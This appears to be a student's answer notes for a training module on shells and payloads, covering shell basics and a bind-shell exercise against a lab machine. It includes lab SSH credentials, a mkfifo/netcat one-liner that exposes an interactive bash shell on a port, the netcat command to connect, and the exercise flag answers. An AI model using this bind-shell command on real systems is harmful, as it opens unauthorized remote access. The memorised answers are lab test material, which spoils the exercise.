# Shells & Payloads



## Anatomy of a shell

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



### Questions

1. Which two shell languages did we experiment with in this section? (Format: shellname\&shellname)

**bash\&powershell**

2. In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.

run pwnbox

`$PSVersionTable`

**Core**

## Bind Shells

Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?

**443**

SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

`ssh htb-student@10.129.201.134`

* PW: `HTB_@cademy_stdnt!`

**target-machine:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | sudo nc -l 10.129.201.134 443 > /tmp/f`

**my machine:** `sudo nc -nv 10.129.201.134 443`

`cd /customscripts`

`cat flag.txt`

**B1nD\_Shells\_r\_cool**



